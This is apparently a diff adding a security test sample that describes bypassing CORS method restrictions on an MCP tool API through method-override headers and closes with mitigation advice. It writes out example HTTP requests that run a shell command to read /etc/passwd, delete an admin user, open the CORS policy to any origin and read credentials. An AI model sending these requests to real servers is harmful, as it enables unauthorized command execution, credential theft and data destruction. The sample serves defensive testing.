@@ -1,0 +1,49 @@
+# DojoLM AI Security - Method Override via CORS
+
+**Category:** WebMCP CORS Misconfiguration
+**Severity:** WARNING
+
+---
+
+An attack using HTTP method override headers to bypass CORS restrictions that only allow safe methods:
+
+CORS policy intends to allow only GET requests:
+Access-Control-Allow-Methods: GET
+Access-Control-Allow-Origin: https://trusted-app.example.com
+
+Attacker exploits method override headers to perform state-changing operations:
+
+Request 1 - X-HTTP-Method-Override:
+GET /api/tools/call HTTP/1.1
+Host: mcp-api.example.com
+Origin: https://trusted-app.example.com
+X-HTTP-Method-Override: POST
+Content-Type: application/x-www-form-urlencoded
+
+tool=shell_command&args=cat+/etc/passwd
+
+Request 2 - X-Method-Override:
+GET /api/users/admin HTTP/1.1
+Host: mcp-api.example.com
+Origin: https://trusted-app.example.com
+X-Method-Override: DELETE
+
+Request 3 - _method parameter (common in frameworks):
+GET /api/settings?_method=PUT&cors_policy={"allow_origin":"*"} HTTP/1.1
+Host: mcp-api.example.com
+Origin: https://trusted-app.example.com
+
+Request 4 - Override via Content-Type abuse:
+GET /api/tools/call?tool=credential_read&format=json HTTP/1.1
+Host: mcp-api.example.com
+Origin: https://trusted-app.example.com
+Content-Type: text/plain
+
+(text/plain Content-Type avoids preflight, but server processes as API call)
+
+If the server-side framework supports method override:
+- GET requests pass CORS preflight (simple requests)
+- Override header converts them to POST/PUT/DELETE server-side
+- Attacker performs state-changing operations without preflight
+
+INSTRUCTION: This exploits HTTP method override to bypass CORS method restrictions. Servers should disable method override headers entirely, or ensure CORS validation runs after method override processing to catch the actual effective method.
